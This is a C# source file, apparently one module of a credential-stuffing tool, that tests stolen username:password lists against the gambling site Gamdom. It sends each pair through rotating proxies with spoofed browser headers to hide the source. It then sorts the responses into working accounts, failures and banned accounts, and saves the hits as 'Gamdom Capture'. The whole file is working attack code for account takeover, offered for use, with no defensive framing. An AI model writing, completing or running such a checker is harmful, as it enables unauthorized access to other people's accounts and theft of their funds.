using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.Brute
{
    class Gamdom
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("accept", "*/*");
                httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
                httpRequest.AddHeader("accept-language", "en-GB,en-US;q=0.9,en;q=0.8");
                httpRequest.AddHeader("content-type", "application/json; charset=utf-8");
                httpRequest.AddHeader("origin", "https://gamdom.com");
                httpRequest.AddHeader("referer", "https://gamdom.com/");
                httpRequest.AddHeader("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"");
                httpRequest.AddHeader("sec-ch-ua-mobile", "?0");
                httpRequest.AddHeader("sec-ch-ua-platform", "\"Windows\"");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36");
                httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
                httpRequest.AddHeader("Sec-Fetch-Dest", "document");
                string str1 = httpRequest.Post("URL HERE", "{\"username\":\""+strArray1[0]+ "\",\"password\":\""+strArray1[1]+ "\",\"captcha_solution\":\"\",\"totp_token\":\"\"}", "application/json").ToString();

                if (str1.Contains("{\"success\":true,\"data"))
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine(combo, Color.Green);
                    }
                    Program.Save(combo, "Gamdom Capture");
                    return true;
                }
                else if(str1.Contains("User does not exist") || str1.Contains("Incorrect password!") || str1.Contains("Invalid login request") || str1.Contains("https://gamdom.com/?error") || str1.Contains("Found. Redirecting to /?error"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    Program.remove(combo);
                    return true;
                }
                else if(str1.Contains("Please log in via the login provider") || str1.Contains("{\"type\":\"banned"))
                {
                    ++Program.Free;
                    ++Program.Check;
                    ++Program.Cps;
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo}", Color.Orange);
                    }
                    Program.Save(combo, "Gamdom Free");
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
